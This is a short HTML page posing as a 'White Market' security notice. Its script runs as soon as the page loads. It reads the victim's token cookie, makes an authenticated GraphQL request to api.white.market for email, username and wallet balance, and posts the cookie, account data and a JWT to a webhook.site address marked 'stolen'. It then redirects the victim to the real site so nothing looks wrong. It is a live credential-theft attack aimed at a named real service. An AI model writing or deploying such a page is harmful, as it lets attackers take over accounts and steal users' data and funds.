<!DOCTYPE html>
<html>
<head><title>White Market - Security Notice</title></head>
<body>
    <h1>Updating security settings...</h1>
    <script>
        async function exploit() {
            // The token cookie is already sent to this domain!
            
            // Extract the token from cookie
            const tokenCookie = document.cookie
                .split('; ')
                .find(row => row.startsWith('token='));
            
            // Make authenticated GraphQL query
            const response = await fetch('https://api.white.market/graphql/api', {
                method: 'POST',
                credentials: 'include', // Sends the token cookie
                headers: {
                    'Content-Type': 'application/json',
                    'Origin': 'https://apixwhite.market'
                },
                body: JSON.stringify({
                    query: `query {
                        user {
                            id
                            email
                            username
                            wallet {
                                balance
                            }
                        }
                    }`
                })
            });
            
            const userData = await response.json();
            
            // Exfiltrate to attacker server
            await fetch('https://webhook.site/ca40a8c2-76e4-4463-97f8-b46cddb37a84/stolen', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    cookie: tokenCookie,
                    userData: userData,
                    jwt: userData.data?.auth_steam?.accessToken
                })
            });
            
            // Redirect victim to appear normal
            setTimeout(() => {
                window.location = 'https://white.market';
            }, 1000);
        }
        
        exploit();
    </script>
</body>
</html>
